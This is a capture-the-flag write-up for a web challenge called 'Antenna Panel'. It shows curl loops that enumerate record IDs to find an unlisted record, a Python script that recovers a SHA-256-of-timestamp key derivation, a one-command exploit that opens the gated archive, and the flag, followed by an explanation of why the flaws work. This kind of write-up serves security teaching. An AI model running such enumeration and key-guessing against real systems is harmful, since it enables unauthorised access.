# Dark Antenna 4/5 — "Antenna Panel"

**Flag:** `reentry{cl0ck_t0k3n_0p3ns_th3_4rchiv3}`

| | |
|---|---|
| Category | Web (IDOR + weak key derivation) |
| Target | `https://reentry-antenna-panel.chals.io` (offline now — event closed) |
| Tools | `curl`, `python3` (stdlib `hashlib`), or a browser |
| Files | none (web challenge) |

> **Challenge brief:** The HALLEY crew brought a modern reactivation console up on MERIDIAN's
> deep-space antenna. Guests can read the public transmission log, but the operator's own records
> are sealed behind an access key the unit derives for itself. Get to the record nobody filed,
> and past the gate in front of it.

Two steps:
1. **"the record nobody filed"** — reach a record that is not on the public list (classic
   **IDOR** / ID enumeration).
2. **"past the gate in front of it"** — the record is behind a gate that wants a 16-hex access
   key. The unit **derives** that key from its own **power-on clock**.

---

## 1. Recon the console

```bash
export URL=https://reentry-antenna-panel.chals.io
curl -s "$URL/" | sed -e 's/<[^>]*>/ /g' -e 's/  */ /g' | grep -A2 -i "transmission\|record\|filed"
```

The page says:

```
Records are filed by unit id; not every filed id is listed here.
```

That is an open invitation to enumerate. The listed record links:

```bash
curl -s "$URL/" | grep -oE '/record/[0-9]+'
# /record/3 /record/12 /record/29 /record/46 /record/58 /record/84
```

---

## 2. Enumerate records — find record 77

A non-existing record returns `404`; keep only `200`:

```bash
for id in $(seq 0 150); do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$URL/record/$id")
  [ "$code" = "200" ] && echo "REC $id -> 200"
done
# REC 3,12,29,46,58,77,84 -> 200     (77 was NOT on the public list)
```

**`/record/77` exists but is not linked** — "the record nobody filed".

```bash
curl -s "$URL/record/77" | sed -e 's/<[^>]*>/ /g' -e 's/  */ /g' | sed -n '1,40p'
```

Key content:

```
REC 077   MERIDIAN OPERATOR JOURNAL
[ RESTRICTED — ADDITIONAL CLEARANCE REQUIRED ]
Release it with this unit's ARCHIVE ACCESS KEY (16 hex). Each unit derives its key
from its own power-on clock at reactivation.

MAINTENANCE REFERENCE — key regeneration
  unit LSU-2   power-on clock 118342800  ->  access key 7170b4986a53d437
  (same routine for every unit)

<form action="/archive" method="post">  KEY> [ token ]  [AUTHORIZE]
```

We get: the gate is `POST /archive` with a `token` field (16 hex); the key is a function of the
power-on clock; and we are handed **one known input/output pair**: `118342800 → 7170b4986a53d437`.

---

## 3. The gate oracle

```bash
curl -s -X POST -d "token=0000000000000000" "$URL/archive" | grep -i "denied\|rejected\|granted"
# [ ACCESS DENIED ] ... rejected — it does not match this unit's derived key.
```

So: a wrong token shows `ACCESS DENIED`; a correct token will not, and shows the flag.

---

## 4. Recover the key-derivation algorithm

One known pair: `118342800 -> 7170b4986a53d437` (16 hex = 8 bytes). Test the common schemes
(hashes of the number as text, truncated to 16 hex):

```bash
python3 - <<'EOF'
import hashlib
clock = "118342800"; target = "7170b4986a53d437"
for algo in ("md5","sha1","sha256","sha512","blake2b","blake2s"):
    h = hashlib.new(algo, clock.encode()).hexdigest()
    for label, cand in (("first16", h[:16]), ("last16", h[-16:])):
        if cand == target: print("HIT:", algo, label, cand)
EOF
# HIT: sha256 first16 7170b4986a53d437
```

**Algorithm:** `access_key = SHA256(ascii(power_on_clock))[:16]`.

---

## 5. The missing piece: this unit's power-on clock

The example `118342800` is for a *different* unit (`LSU-2`). This unit's clock is not shown on
the page, not in headers/cookies/comments, and not at any other endpoint. Brute-forcing a
"now-ish" (2026) Unix timestamp finds nothing — a sign the value is **not** modern.

From the earlier stages of this series:
- **2/5 Handshake** — rolling the LFSR back to boot gave state `0x0E70AE00` = **`242265600`** =
  `1977-09-05 00:00:00 UTC` (Voyager 1 launch day).
- **3/5 Demodulator** — the decrypted operator log is dated **`1977-09-05`**.

So **the MERIDIAN unit's power-on clock = `242265600`**.

---

## 6. Compute the key and open the archive

```bash
key() { python3 -c "import hashlib,sys;print(hashlib.sha256(sys.argv[1].encode()).hexdigest()[:16])" "$1"; }
key 242265600      # -> 32be718274ff007c
curl -s -X POST -d "token=32be718274ff007c" "$URL/archive" | grep -i "granted\|flag\|reentry"
# [ CLEARANCE GRANTED ]  flag: reentry{cl0ck_t0k3n_0p3ns_th3_4rchiv3}
```

> **Verification note:** The service is offline now, but the key derivation is reproducible:
> `SHA256("118342800")[:16] = 7170b4986a53d437` (matches the given reference) and
> `SHA256("242265600")[:16] = 32be718274ff007c`. I confirmed both locally.

🚩 **Flag:** `reentry{cl0ck_t0k3n_0p3ns_th3_4rchiv3}`

---

## 7. Dead ends (checked)

- **SSTI** — the token is echoed, but `{{7*7}}` comes back literally; input is escaped, no Jinja2.
- **Debug/traceback** — odd ids (`/record/abc`, `/record/-1`) give plain `404`.
- **Source leak** — `/app.py`, `/.git/HEAD`, `/flag` → `404`.
- **Brute-forcing a 2026 timestamp** → nothing (the clock is from 1977).

---

## 8. One-command exploit

```bash
URL=https://reentry-antenna-panel.chals.io; \
K=$(python3 -c "import hashlib;print(hashlib.sha256(b'242265600').hexdigest()[:16])"); \
curl -s -X POST -d "token=$K" "$URL/archive" | grep -oE 'reentry\{[^}]+\}'
```

---

## 9. Hints for stage 5

After opening, record 077 reveals the archive map: `signal_1977.iq` was PURGED (overwritten),
Reed-Solomon coded, at offset `0x0400`, NAME-CRC32 `0x6ABD5D61`, on volume `archive.img`. Download
`archive.img` for stage 5.

## 10. Why it works

1. **IDOR by ID enumeration** — "not every filed id is listed here". The operator record (`77`)
   exists at a predictable `/record/<id>` but is deliberately not linked.
2. **Derived, not random, key** — the gate computes the key from one number via
   `SHA256(str(clock))[:16]`. The "maintenance reference" leaks the whole algorithm.
3. **The secret is the clock, and the clock is known** — the "secret" is a low-entropy,
   guessable value (a timestamp) revealed by earlier stages. Even SHA-256 does not help when the
   input can be guessed. Classic weak key derivation.

> **Previous:** [3 - Demodulator](3%20-%20Demodulator.md) · **Next:** [5 - Erased Traces](5%20-%20Erased%20Traces.md)
